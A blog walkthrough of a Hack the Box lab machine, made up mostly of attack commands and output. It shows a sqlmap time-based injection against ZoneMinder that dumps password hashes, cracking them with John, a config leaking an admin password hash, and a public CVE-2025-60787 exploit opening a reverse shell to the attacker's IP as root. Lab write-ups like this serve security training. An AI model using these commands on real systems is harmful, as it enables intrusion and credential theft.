{ "@context": "http://schema.org", "@type": "BlogPosting", "mainEntityOfPage": { "@type": "WebPage", "@id": "https://www.ibrahimisiaqbolaji.com/2026/03/cctv-hack-box-walkthrough.html" }, "headline": "CCTV Hack the Box Walkthrough","description": "Welcome to another Hack the Box walkthrough. In this blog post, I have demonstrated how I owned the CCTV machine on Hack the Box. Hack The B...","datePublished": "2026-03-09T16:15:00+01:00", "dateModified": "2026-03-09T19:38:13+01:00","image": { "@type": "ImageObject","url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq7OnDMHJwPMUyXCCiSdrffSXweoYnnjobQrqdxuV9bIMkHeDVNsCuqar2M3clTNI6U95nbBQwusslrdtwsSUNTYMQaVrcjWUo29rZpMiVqyVh41keRd\_VqaekBWXJNMLQma0RYcfRvitwis6TuVzrRqriTL1eD5dIKAHHNn0oEDKdrw97eGoWQZ242t8E/w1200-h630-p-k-no-nu/bandicam%202026-03-09%2018-14-13-381.jpg", "height": 630, "width": 1200},"publisher": { "@type": "Organization", "name": "Blogger", "logo": { "@type": "ImageObject", "url": "https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti\_rBAs9yMYOFBujxriJRZ-A=h60", "width": 206, "height": 60 } },"author": { "@type": "Person", "name": "Ibrahim Isiaq Bolaji" } }

[Home](https://www.ibrahimisiaqbolaji.com/?m=1)[Hack The Box](https://www.ibrahimisiaqbolaji.com/search/label/Hack%20The%20Box?m=1?&max-results=6)CCTV Hack the Box Walkthrough

{ "@context": "http://schema.org", "@type": "BreadcrumbList", "@id": "#Breadcrumb", "itemListElement": \[{ "@type": "ListItem", "position": 1, "item": { "name": "Home", "@id": "https://www.ibrahimisiaqbolaji.com/?m\\u003d1" } },{ "@type": "ListItem", "position": 2, "item": { "name": "Hack The Box", "@id": "https://www.ibrahimisiaqbolaji.com/search/label/Hack%20The%20Box?m\\u003d1" } },{ "@type": "ListItem", "position": 3, "item": { "name": "CCTV Hack the Box Walkthrough", "@id": "https://www.ibrahimisiaqbolaji.com/2026/03/cctv-hack-box-walkthrough.html?m\\u003d1" } }\] }

CCTV Hack the Box Walkthrough
=============================

[Ibrahim Isiaq Bolaji](https://www.blogger.com/profile/12740038691848936533 "Ibrahim Isiaq Bolaji") March 09, 2026
...
Copy sudo openvpn cctv.ovpn

.code-container { position: relative; background-color: #f5f5f5; border-radius: 8px; padding: 1rem; margin: 1rem 0; font-family: monospace; } .copy-button { position: absolute; top: 8px; right: 8px; background: #007bff; color: white; border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer; font-size: 12px; } .editable-code { width: 100%; border: none; background: transparent; resize: none; outline: none; font-family: monospace; font-size: 14px; color: #333; }
...
Copy echo "10.129.119.247 cctv.htb" | sudo tee -a /etc/hosts
...
Copy nmap -p- --min-rate 5000 -sS 10.129.119.247
...
Copy Username: admin Password: admin
...
Copy https://github.com/BwithE/CVE-2024-51482
...
Copy /zm/index.php?view=request&request=event&action=removetag&tid=<PAYLOAD></PAYLOAD>
...
Copy ZMSESSID=jinco4bhig0up657ul2h5u4rjk
...
Copy sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\ -D zm -T Users -C Username,Password --dump --batch \\ --dbms=MySQL --technique=T \\ --cookie="ZMSESSID=jinco4bhig0up657ul2h5u4rjk" \\ --time-sec=2
...
Copy +------------+--------------------------------------------------------------+ | Username | Password | +------------+--------------------------------------------------------------+ | superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm | | mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. | | admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m | +------------+--------------------------------------------------------------+
...
Copy sudo nano zm\_users\_hash.txt

Inside the file, I pasted the hashes that were previously extracted from the database:

Copy $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
...
Copy john zm\_users\_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
...
Copy cat /etc/systemd/system/motioneye.service
...
Copy \[Service\] User=root RuntimeDirectory=motioneye LogsDirectory=motioneye StateDirectory=motioneye ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf Restart=on-abort
...
Copy cat /etc/motioneye/motion.conf
...
Copy \# @admin\_username admin # @admin\_password 989c5a8ee87a0e9521ec81a79187d162109282f0
...
Copy webcontrol\_port 7999 webcontrol\_localhost on
...
Copy cat /opt/video/backups/server.log
...
Copy Authorization as sa\_mark successful. Command issued: status. Outcome: success. Authorization as sa\_mark successful. Command issued: disk-info. Outcome: success.
...
Copy ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
...
Copy Username: admin Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
...
Copy configUiValid = function() { return true; };
...
Copy git clone https://github.com/gunzf0x/CVE-2025-60787.git
...
Copy python3 CVE-2025-60787.py revshell \\ --url 'http://127.0.0.1:8765' \\ --user 'admin' \\ --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \\ -i 10.10.14.56 \\ --port 4444
...
Copy \[\*\] Payload successfully injected. Check your shell...
...
Copy connect to \[10.10.14.56\] from (UNKNOWN) \[10.129.119.247\] 39166 bash: cannot set terminal process group (4315): Inappropriate ioctl for device bash: no job control in this shell root@cctv:/etc/motioneye#
